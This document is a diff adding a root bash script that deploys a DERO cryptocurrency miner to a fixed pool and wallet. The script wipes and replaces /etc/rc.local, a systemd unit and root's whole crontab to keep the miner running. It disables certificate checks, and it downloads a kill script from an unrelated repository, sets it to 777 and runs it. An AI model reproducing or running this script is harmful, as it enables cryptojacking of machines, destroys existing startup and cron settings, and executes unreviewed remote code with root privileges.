@@ -1,0 +1,94 @@
+apt update
+apt install -y bc
+wget --no-check-certificate -O dero.tar.gz https://github.com/DeroLuna/dero-miner/releases/download/v1.13-beta/deroluna-miner-linux-amd64.tar.gz
+tar -xvf dero.tar.gz
+cores=$(nproc --all)
+IP4=$(curl -4 -s icanhazip.com)
+  convert_dots_to_underscore() {
+    echo "$1" | tr '.' '-'
+}
+IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
+writeFile(){
+cat <<EOT >> /root/list.txt
+derokingeu3.zapto.org
+
+EOT
+}
+writeFile
+
+pool=$(nearest_server=""
+min_delay=9999 # Maximum acceptable delay in milliseconds
+
+while read -r server location; do
+    delay=$(ping -c 1 "$server" | grep -oP 'time=\K\d+\.\d+')
+    if [ -n "$delay" ] && (( $(echo "$delay < $min_delay" | bc -l) )); then
+        min_delay=$delay
+        nearest_server="$server"
+    fi
+done < /root/list.txt
+if [ -z "$nearest_server" ]; then
+    nearest_server="derokingeu3.zapto.org"
+fi
+
+echo "$nearest_server"
+)
+
+cat /dev/null > /root/minerdero.sh
+cat >>/root/minerdero.sh <<EOF
+#!/bin/bash
+#cpulimit --limit=$limitCPU -P deroluna-miner -b
+nohup ./deroluna-miner -d $pool:10100 -w dero1qyyqcn6f3v4vlvq4gfe45n0h8xg865n45rq6thqxlqfyvt92tjdf2qqqpa5c0 -t $cores --exit-on-zero-hashrate  > /root/hash.log 2>&1 &
+EOF
+chmod +x /root/minerdero.sh
+
+
+
+cat /dev/null > /etc/rc.local
+cp /root/minerdero.sh /etc/rc.local
+chmod +x /etc/rc.local
+
+cat /dev/null > /etc/systemd/system/rc-local.service
+
+cat >>/etc/systemd/system/rc-local.service <<EOF
+[Unit]
+Description=/etc/rc.local Support
+ConditionPathExists=/etc/rc.local
+
+[Service]
+ExecStart=/etc/rc.local start
+TimeoutSec=0
+StandardOutput=tty
+RemainAfterExit=yes
+SysVStartPriority=99
+
+[Install]
+WantedBy=multi-user.target 
+EOF
+
+cat /dev/null > /root/checkdero.sh
+cat >>/root/checkdero.sh <<EOF
+#!/bin/bash
+if pgrep deroluna-miner >/dev/null
+then
+  echo "dero is running."
+else
+  echo "dero isn't running"
+  bash /root/killdero.sh
+  bash /root/minerdero.sh
+fi
+EOF
+chmod +x /root/checkdero.sh
+
+rm /root/killdero.sh
+wget "https://raw.githubusercontent.com/nambui979/xelis/main/killxelis" --output-document=/root/killdero.sh
+chmod 777 /root/killdero.sh
+
+cat /dev/null > /var/spool/cron/crontabs/root
+cat >>/var/spool/cron/crontabs/root<<EOF
+*/10 * * * * bash /root/checkdero.sh > /root/checkdero.log
+EOF
+chmod 0600 /var/spool/cron/crontabs/*
+service cron restart
+
+./killdero.sh
+./minerdero.sh
